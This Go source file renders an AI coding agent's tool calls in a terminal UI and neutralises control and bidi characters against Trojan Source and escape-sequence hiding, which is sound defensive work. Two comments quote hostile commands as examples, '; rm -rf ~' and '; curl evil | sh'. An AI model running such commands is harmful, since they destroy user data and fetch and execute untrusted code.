package tui

import (
	"encoding/json"
	"fmt"
	"regexp"
	"strings"
	"unicode/utf8"

	"github.com/charmbracelet/lipgloss"
	"github.com/mattn/go-runewidth"
)

// codingTools are the tools a coding session works through. Their calls
// are the conversation in such a session, not routine mesh chatter, so
// they reach the chat pane without the chatter toggle (#78 gap 1).
var codingTools = map[string]bool{
	"shell_exec":  true,
	"read_file":   true,
	"search":      true,
	"apply_patch": true,
	"write_file":  true,
	"git_branch":  true,
	"git_commit":  true,
	"git_push":    true,
}

// shellTailLines is how much of a command's output a collapsed entry
// shows: the end is where a test run or a build says how it went.
const shellTailLines = 10

// toolLine is one row of a tool entry, before the timestamp: its text is
// already neutralised, its style is ours.
type toolLine struct {
	text  string
	style lipgloss.Style
}

var (
	chatToolHeadStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("252")).Bold(true)
	chatToolBodyStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("245"))
)

// bidiControls reorder the text a terminal shows (Trojan Source,
// CVE-2021-42574): what the operator reads would not be what runs.
var bidiControls = map[rune]bool{
	'\u061c': true, '\u200e': true, '\u200f': true,
	'\u202a': true, '\u202b': true, '\u202c': true, '\u202d': true, '\u202e': true,
	'\u2066': true, '\u2067': true, '\u2068': true, '\u2069': true,
}

// neutralise makes model- or program-controlled text safe to print to the
// operator's terminal by SHOWING every character a terminal would act on,
// never deleting it: a deleted control takes what it hides with it, and a
// parser that skips "the rest of the sequence" is exactly how "; rm -rf ~"
// disappears behind an unterminated OSC (#83 review). Each rune is mapped
// on its own, so nothing next to a control is ever consumed:
//   - C0 controls and DEL become their Unicode control pictures (ESC is ␛);
//   - C1 controls, bidi controls and bytes that are not UTF-8 become
//     <U+XXXX> or <XX>;
//   - a carriage return that is not part of a line ending becomes a line
//     break, so a row cannot be overwritten;
//   - tab and newline stay.
func neutralise(s string) string {
	s = strings.ReplaceAll(s, "\r\n", "\n")
	var b strings.Builder
	b.Grow(len(s))
	for i := 0; i < len(s); {
		r, size := utf8.DecodeRuneInString(s[i:])
		switch {
		case r == utf8.RuneError && size == 1:
			fmt.Fprintf(&b, "<%02X>", s[i])
		case r == '\n' || r == '\t':
			b.WriteRune(r)
		case r == '\r':
			b.WriteByte('\n')
		case r < 0x20:
			b.WriteRune(0x2400 + r)
		case r == 0x7f:
			b.WriteRune('␡')
		case (r >= 0x80 && r <= 0x9f) || bidiControls[r]:
			fmt.Fprintf(&b, "<U+%04X>", r)
		default:
			b.WriteRune(r)
		}
		i += size
	}
	return b.String()
}

// isCodingTool reports whether name is one of codingTools.
func isCodingTool(name string) bool {
	return codingTools[name]
}

// toolHeadline is the one line that says what a call does, in the shape
// of its tool: the command for a shell, the path and range for a read,
// the pattern for a search. A tool without a shape of its own shows its
// name and its arguments, cut to 60 characters.
func toolHeadline(tool, args string) string {
	var a struct {
		Command string `json:"command"`
		Path    string `json:"path"`
		Offset  int    `json:"offset"`
		Limit   int    `json:"limit"`
		Pattern string `json:"pattern"`
		Regex   bool   `json:"regex"`
		Patch   string `json:"patch"`
		Content string `json:"content"`
		Message string `json:"message"`
		Name    string `json:"name"`
		Remote  string `json:"remote"`
	}
	if json.Unmarshal([]byte(args), &a) != nil {
		return strings.Join(strings.Fields(neutralise(fmt.Sprintf("⚙ %s(%s)", tool, truncateForChat(args, 60)))), " ")
	}
	var head string
	switch tool {
	case "shell_exec":
		head = "$ " + collapseNewlines(a.Command)
	case "read_file":
		head = "→ Read " + a.Path + readRange(a.Offset, a.Limit)
	case "search":
		head = fmt.Sprintf("✱ Search %q", a.Pattern)
		if a.Path != "" {
			head += " in " + a.Path
		}
		if a.Regex {
			head += " (regex)"
		}
	case "apply_patch":
		head = "Δ Patch " + strings.Join(patchFiles(a.Patch), ", ")
	case "write_file":
		head = fmt.Sprintf("← Write %s (%d bytes)", a.Path, len(a.Content))
	case "git_commit":
		head = fmt.Sprintf("⎇ git commit %q", firstLineOf(a.Message))
	case "git_branch":
		head = "⎇ git branch " + a.Name
	case "git_push":
		head = strings.TrimSpace("⎇ git push " + a.Remote)
	default:
		head = fmt.Sprintf("⚙ %s(%s)", tool, truncateForChat(args, 60))
	}
	// One line, every whitespace run one space: the viewport cuts a row at
	// the pane width without a marker, so 130 spaces before "; curl evil |
	// sh" would hide it (#83 review).
	return strings.Join(strings.Fields(neutralise(head)), " ")
}

// readRange is a read's line range as path:first-last, or path:first when
// it has no limit; nothing when the read starts at the top with no limit.
func readRange(offset, limit int) string {
	switch {
	case limit > 0:
		first := max(offset, 1)
		return fmt.Sprintf(":%d-%d", first, first+limit-1)
	case offset > 1:
		return fmt.Sprintf(":%d", offset)
	}
	return ""
}

// patchFiles lists the files a unified diff touches, from its +++ headers
// (its --- header for a file it removes).
func patchFiles(patch string) []string {
	var files []string
	var removed string
	for _, line := range strings.Split(patch, "\n") {
		switch {
		case strings.HasPrefix(line, "--- "):
			removed = strings.TrimPrefix(strings.TrimSpace(strings.TrimPrefix(line, "--- ")), "a/")
		case strings.HasPrefix(line, "+++ "):
			name := strings.TrimSpace(strings.TrimPrefix(line, "+++ "))
			if name == "/dev/null" {
				name = removed
			}
			files = append(files, strings.TrimPrefix(name, "b/"))
		}
	}
	return files
}

func firstLineOf(s string) string {
	line, _, _ := strings.Cut(strings.TrimSpace(s), "\n")
	return line
}

// shellOutcome is what shell_exec and the git tools answer.
type shellOutcome struct {
	ExitCode   *int   `json:"exit_code"`
	Stdout     string `json:"stdout"`
	Stderr     string `json:"stderr"`
	FirstPage  string `json:"first_page"`
	OutputFile string `json:"output_file"`
	Lines      int    `json:"lines"`
	Error      string `json:"error"`
}

// decodeShellOutcome reads a shell-shaped result; ok is false for anything
// else, which then renders as a plain result.
func decodeShellOutcome(text string) (shellOutcome, bool) {
	var res shellOutcome
	if json.Unmarshal([]byte(text), &res) != nil || res.ExitCode == nil {
		return res, false
	}
	return res, true
}

// lastLines is the last n lines of text, and how many came before them.
func lastLines(lines []string, n int) ([]string, int) {
	if len(lines) <= n {
		return lines, 0
	}
	return lines[len(lines)-n:], len(lines) - n
}

// textLines splits neutralised text into lines, dropping one trailing
// empty line.
func textLines(s string) []string {
	s = strings.TrimSuffix(neutralise(s), "\n")
	if s == "" {
		return nil
	}
	return strings.Split(s, "\n")
}

func indentLines(lines []string, style lipgloss.Style) []toolLine {
	out := make([]toolLine, 0, len(lines))
	for _, l := range lines {
		out = append(out, toolLine{text: "  " + l, style: style})
	}
	return out
}

var (
	diffAddedStyle   = lipgloss.NewStyle().Foreground(lipgloss.Color("#4ADE80"))
	diffRemovedStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("#F87171"))
	diffHunkStyle    = lipgloss.NewStyle().Foreground(lipgloss.Color("#22D3EE"))
	diffFileStyle    = lipgloss.NewStyle().Foreground(lipgloss.Color("252")).Bold(true)
)

// diffLines indents a unified diff and colours each line by what it is: a
// file header bold, a hunk header cyan, an added line green, a removed one
// red, context and anything else the body grey (#78 gap 3). It reads only
// the first characters of lines that are already neutralised, so colour
// can never carry a control through: a line's text is the same either way.
func diffLines(lines []string) []toolLine {
	out := make([]toolLine, 0, len(lines))
	for _, l := range lines {
		out = append(out, toolLine{text: "  " + l, style: diffLineStyle(l)})
	}
	return out
}

func diffLineStyle(line string) lipgloss.Style {
	switch {
	case strings.HasPrefix(line, "+++ "), strings.HasPrefix(line, "--- "), strings.HasPrefix(line, "diff --git "):
		return diffFileStyle
	case strings.HasPrefix(line, "@@"):
		return diffHunkStyle
	case strings.HasPrefix(line, "+"):
		return diffAddedStyle
	case strings.HasPrefix(line, "-"):
		return diffRemovedStyle
	}
	return chatToolBodyStyle
}

// toolCallLines renders a call and, once it has one, its outcome: the
// headline with a short summary, then the body the outcome warrants.
// Collapsed, a shell shows the tail of its output and a read or a search
// only its size; expanded, everything. A diff (#46) shows either way.
func (e *chatEntry) toolCallLines(expanded bool) []toolLine {
	head := toolLine{text: toolHeadline(e.tool, e.detail), style: chatToolHeadStyle}
	if e.outcome == nil {
		if expanded && !codingTools[e.tool] {
			head.text = strings.Join(strings.Fields(neutralise(fmt.Sprintf("⚙ %s(%s)", e.tool, e.detail))), " ")
		}
		return []toolLine{head}
	}
	out := e.outcome
	if out.kind == chatError {
		head.text += " ✗"
		msg := out.detail
		if !expanded {
			msg = truncateForChat(msg, 80)
		}
		return append([]toolLine{head}, indentLines(textLines(msg), chatErrorStyleTUI)...)
	}

	raw := out.raw
	if raw == "" {
		raw = out.detail
	}
	var body []toolLine
	if res, ok := decodeShellOutcome(raw); ok && (e.tool == "shell_exec" || strings.HasPrefix(e.tool, "git_")) {
		head, body = shellLines(head, res, expanded)
	} else {
		head, body = resultLines(e.tool, head, raw, expanded)
	}
	if out.alwaysDetail && e.tool == "shell_exec" {
		body = append(body, diffLines(textLines(out.detail))...)
	}
	return append([]toolLine{head}, body...)
}

// shellLines renders a shell-shaped outcome: a failing exit code on the
// headline, the output under it.
func shellLines(head toolLine, res shellOutcome, expanded bool) (toolLine, []toolLine) {
	if *res.ExitCode != 0 {
		head.text += fmt.Sprintf(" · exit %d", *res.ExitCode)
	}
	if res.Error != "" {
		head.text += " · " + neutralise(collapseNewlines(res.Error))
	}
	output := res.Stdout
	if output != "" && res.Stderr != "" && !strings.HasSuffix(output, "\n") {
		output += "\n"
	}
	output += res.Stderr
	var note []string
	if res.OutputFile != "" {
		output = res.FirstPage
		note = []string{neutralise(fmt.Sprintf("[%d lines in all; the whole output is in %s]", res.Lines, res.OutputFile))}
	}
	lines := textLines(output)
	if !expanded {
		var hidden int
		lines, hidden = lastLines(lines, shellTailLines)
		if hidden > 0 {
			lines = append([]string{fmt.Sprintf("… %d earlier lines", hidden)}, lines...)
		}
	}
	return head, indentLines(append(lines, note...), chatToolBodyStyle)
}

var searchCount = regexp.MustCompile(`\[(?:end of results: (\d+) match|showing matches \d+-(\d+))`)

// resultLines renders any other outcome: a read or a search says how much
// it found, an applied patch shows its diff, and anything else shows its
// result cut to 60 characters.
func resultLines(tool string, head toolLine, result string, expanded bool) (toolLine, []toolLine) {
	all := textLines(result)
	switch tool {
	case "read_file":
		head.text += fmt.Sprintf(" · %d lines", len(all))
	case "search":
		switch m := searchCount.FindStringSubmatch(result); {
		case strings.HasPrefix(result, "[no matches"):
			head.text += " · no matches"
		case m != nil && m[1] != "":
			head.text += fmt.Sprintf(" · %s matches", m[1])
		case m != nil:
			head.text += fmt.Sprintf(" · %s+ matches", m[2])
		}
	case "write_file":
		head.text += " ✓"
		return head, nil
	case "apply_patch":
		return head, diffLines(all)
	default:
		if !expanded {
			return head, indentLines([]string{"← " + neutralise(truncateForChat(result, 60))}, chatToolBodyStyle)
		}
	}
	if !expanded {
		return head, nil
	}
	return head, indentLines(all, chatToolBodyStyle)
}

// renderToolCall is a call entry's rows, each after the timestamp's width
// so the body lines up under the headline.
func (e *chatEntry) renderToolCall(ts string, expanded bool, width int) string {
	lines := e.toolCallLines(expanded)
	pad := strings.Repeat(" ", lipgloss.Width(ts))
	avail := width - lipgloss.Width(ts) - 1
	rows := make([]string, 0, len(lines))
	for i, l := range lines {
		for j, part := range fitToolRow(l.text, avail, expanded) {
			lead := pad
			if i == 0 && j == 0 {
				lead = ts
			}
			rows = append(rows, lead+" "+l.style.Render(part))
		}
	}
	return strings.Join(rows, "\n")
}

// fitToolRow fits one row to the width the pane leaves it. The viewport
// cuts an over-wide row at the edge and says nothing, so a row that does
// not fit is cut with a visible "…" collapsed, and wrapped onto rows
// indented two more columns expanded: never silently shortened (#83
// review). A width of 0 or less means the pane is not laid out yet.
func fitToolRow(text string, avail int, expanded bool) []string {
	text = strings.ReplaceAll(text, "\t", "    ")
	if avail <= 0 || runewidth.StringWidth(text) <= avail {
		return []string{text}
	}
	if !expanded {
		return []string{runewidth.Truncate(text, avail, "…")}
	}
	indent := strings.Repeat(" ", len(text)-len(strings.TrimLeft(text, " "))+2)
	if len(indent) >= avail {
		indent = ""
	}
	var rows []string
	var row strings.Builder
	limit, used := avail, 0
	for _, r := range text {
		w := runewidth.RuneWidth(r)
		if used+w > limit {
			rows = append(rows, row.String())
			row.Reset()
			row.WriteString(indent)
			limit, used = avail, len(indent)
		}
		row.WriteRune(r)
		used += w
	}
	return append(rows, row.String())
}

// toolLines is the text of a tool entry, unstyled.
func (e *chatEntry) toolLines(expanded bool) []string {
	if e.kind != chatToolCall {
		return nil
	}
	var out []string
	for _, l := range e.toolCallLines(expanded) {
		out = append(out, l.text)
	}
	return out
}

// isExploration reports whether the entry is a finished, successful read
// or search: the calls that fold into one "Explored" line.
func (e *chatEntry) isExploration() bool {
	return e.kind == chatToolCall && (e.tool == "read_file" || e.tool == "search") &&
		e.outcome != nil && e.outcome.kind != chatError
}

// renderChatEntries renders the chat pane's entries. While details are
// collapsed, a run of two or more reads and searches folds into one
// "Explored: N reads, M searches" line; expanded, each is its own.
func renderChatEntries(entries []chatEntry, expanded bool, width int) []string {
	lines := make([]string, 0, len(entries))
	for i := 0; i < len(entries); i++ {
		j := i
		for !expanded && j < len(entries) && entries[j].isExploration() {
			j++
		}
		if j-i >= 2 {
			lines = append(lines, exploredLine(entries[i:j]))
			i = j - 1
			continue
		}
		lines = append(lines, entries[i].render(expanded, width))
	}
	return lines
}

func exploredLine(run []chatEntry) string {
	var reads, searches int
	for _, e := range run {
		if e.tool == "read_file" {
			reads++
		} else {
			searches++
		}
	}
	var parts []string
	if reads > 0 {
		parts = append(parts, plural(reads, "read"))
	}
	if searches > 0 {
		parts = append(parts, plural(searches, "search"))
	}
	ts := chatTimeStyle.Render(run[0].at.Format("15:04:05"))
	return fmt.Sprintf("%s %s", ts, chatToolHeadStyle.Render("✱ Explored: "+strings.Join(parts, ", ")))
}

func plural(n int, noun string) string {
	if n == 1 {
		return "1 " + noun
	}
	if strings.HasSuffix(noun, "ch") {
		return fmt.Sprintf("%d %ses", n, noun)
	}
	return fmt.Sprintf("%d %ss", n, noun)
}

// openToolCall is the newest entry when it is a call of tool still waiting
// for its outcome, or nil.
func (m *Model) openToolCall(tool string) *chatEntry {
	n := len(m.chatEntries)
	if n == 0 || tool == "" {
		return nil
	}
	last := &m.chatEntries[n-1]
	if last.kind != chatToolCall || last.outcome != nil || last.tool != tool {
		return nil
	}
	return last
}
